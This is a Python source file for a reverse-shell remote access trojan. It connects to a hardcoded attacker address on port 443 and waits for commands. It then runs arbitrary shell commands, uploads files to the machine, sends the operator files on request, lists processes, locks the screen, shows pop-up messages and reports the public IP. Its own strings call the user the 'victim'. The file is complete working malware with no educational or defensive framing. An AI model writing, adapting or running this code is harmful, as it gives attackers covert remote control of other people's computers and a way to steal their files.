import socket
import os
import subprocess
import pyautogui
from requests import get

#1
target_host = "192.168.0.187"
target_port = 443
#2
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((target_host,target_port))
#3
while True:
    try:
        executed = False
        data = client.recv(16777216)
        try:
            command = data.decode("utf-8")
        except UnicodeDecodeError:
            file = data
            client.send(str.encode("y"))
            data = client.recv(2048)
            fname = data.decode("utf-8")
            f = open(fname, "wb")
            f.write(file)
            f.close()
            executed = True
            command = "sent"

        if command == "sent":
            client.send(str.encode("Successfully uploaded "+ fname + "\n"+str(os.getcwd()) + "> "))
            executed = True

        if command[:2] == "cd":
            os.chdir(command[3:])
            client.send(str.encode(str(os.getcwd()) + "> "))
            executed = True

        if command == "tasks":
            cmd = subprocess.Popen("tasklist", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
            output_bytes = cmd.stdout.read()
            output_str = str(output_bytes, "utf-8")
            client.send(str.encode(output_str + "\n" + str(os.getcwd()) + "> "))
            executed = True

        if command[:3] == "msg":
            text = command.replace("msg","")
            pyautogui.alert(text, timeout=30000)
            client.send(str.encode("[*] Message sent successfully!\n" + str(os.getcwd()) + "> "))
            executed = True

        if command == "lock":
            os.system("rundll32.exe user32.dll, LockWorkStation")
            client.send(str.encode("[*] Locked victims screen \n" + str(os.getcwd()) + "> "))
            executed = True

        if command == "ip":
            ip = get('https://api.ipify.org').text
            client.send(str.encode("[*] Victims ip: " + ip + "\n"+ str(os.getcwd()) + "> "))
            executed = True

        if command == "terminate":
            client.close()
            exit()

        if command[:8] == "download":
            fname = command.replace("download ","")
            f = open(fname, "rb")
            file = f.read()
            client.send(file)
            executed = True

        if executed == False:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
            output_bytes = cmd.stdout.read()
            output_str = str(output_bytes, "utf-8")
            client.send(str.encode(output_str + str(os.getcwd()) + "> "))
            #print(output_str)

    except Exception as e:
        error = str(e)
        client.send(str.encode("[!] Client error: "+error))


client.close()